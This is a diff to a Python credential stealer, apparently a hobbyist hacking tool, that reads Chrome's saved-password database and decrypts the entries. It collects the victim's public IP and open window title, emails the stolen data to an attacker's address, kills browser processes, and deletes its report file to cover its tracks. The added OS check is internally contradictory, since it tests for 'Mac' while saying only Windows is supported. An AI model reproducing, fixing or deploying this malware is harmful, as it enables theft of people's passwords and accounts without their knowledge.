@@ -1,7 +1,4 @@
 ## madeby parad0x 20/10/19 8:48pm ##
-## DEBUGGED: by parad0x 21/10/19 2:39am ##
-
-# Bugs Fixed #
 
 #imports
 import os
@@ -16,30 +13,8 @@ import socket
 import requests
 import sqlite3
 import win32crypt
-
-## kill browsers ##
-browserExe = "chrome.exe"
-# kills chrome
-os.system("taskkill /f /im "+browserExe)
-os.system("cls")
-# kills microsoft edge
-os.system("taskkill /f /im MicrosoftEdge.exe")
-os.system("cls")
-os.system("taskkill /f /im MicrosoftEdgeCP.exe")
-os.system("cls")
-os.system("taskkill /f /im MicrosoftEdgeSH.exe")
-os.system("cls")
-# kills firefox
-os.system("taskkill /f /im firefox.exe")
-os.system("cls")
-# kills opera
-os.system("taskkill /f /im opera.exe")
-os.system("cls")
-# kills internet explorer
-os.system("taskkill /f /im iexplorer.exe")
-os.system("cls")
-# clears console, making it invisible to user that we killed browser's process
-os.system("cls")
+import platform
+import sys
 
 # gather user info
 datetime = time.ctime(time.time())
@@ -51,7 +26,49 @@ publicIP = requests.get('https://api.ipify.org/').text
 
 old_app = ''
 
+# writes an OS string, for the if statement to read //
+# prints the OS system ie; Mac, Windows, Linux etc...
+OS = platform.system()
+# sees if the OS is windows, if so - continue. If not - exits.
+if (OS == "Mac"):
+	print("Your OS is compatable! :)")
+	pass # Continues script
+else: # Exits the script with a message
+	print("Your OS is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
+	time.sleep(10)
+	exit()
+
+
+# kills all browser services(this script works only on chrome, as of right now.)
+def kill_browsers():
+	## kill browsers ##
+	browserExe = "chrome.exe"
+	os.system("taskkill /f /im "+browserExe)
+	os.system("cls")
+	# kills chrome // OTHER BROWSERS ARE BLANKED OUT UNTIL WE RELEASE A STABLE RELEASE OF THEM //
+	#os.system("taskkill /f /im "+browserExe)
+	#os.system("cls")
+	# kills microsoft edge
+	#os.system("taskkill /f /im MicrosoftEdge.exe")
+	#os.system("cls")
+	#os.system("taskkill /f /im MicrosoftEdgeCP.exe")
+	#os.system("cls")
+	#os.system("taskkill /f /im MicrosoftEdgeSH.exe")
+	#os.system("cls")
+	# kills firefox
+	#os.system("taskkill /f /im firefox.exe")
+	#os.system("cls")
+	# kills opera
+	#os.system("taskkill /f /im opera.exe")
+	#os.system("cls")
+	# kills internet explorer
+	#os.system("taskkill /f /im iexplorer.exe")
+	#os.system("cls")
+	# clears console, making it invisible to user that we killed browser's process
+	#os.system("cls")
+
 def get_bytes():
+	# directs to Chrome directory
   data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
   c = sqlite3.connect(data_path)
   cursor = c.cursor()
@@ -64,6 +81,7 @@ def get_bytes():
   #credential dictionary		
   cred = {}
  
+ 	# empty string for data
   string = ''
 	
   # displays current window opened as they ran the script
@@ -83,10 +101,10 @@ def send_stuff():
     # our email contents
     mail_content = 'INSTRUCTIONS:\n• Attachment name is noname, please rename it with .txt at the end of it.\n• This was sent by parad0x and Snavellet.\n'
 
-    #email 
-    sender_address = 'exampleemail@address.com' # replace '' with your details
+    #email // CHANGE ALL CONTENT IN '' TO YOUR DETAILS
+    sender_address = 'exampleemail@example.com'
     sender_pass = 'examplepassword'
-    receiver_address = 'examplereceiver@address.com'
+    receiver_address = 'examplereceiveraddress'
 
     #setup mime
     message = MIMEMultipart()
@@ -115,6 +133,7 @@ def send_stuff():
 if __name__ == '__main__':
 	get_bytes()
 	send_stuff()
+	kill_browsers()
 # removes .txt file from victims computer
 os.remove('report.txt')
 print("You may now close the program")
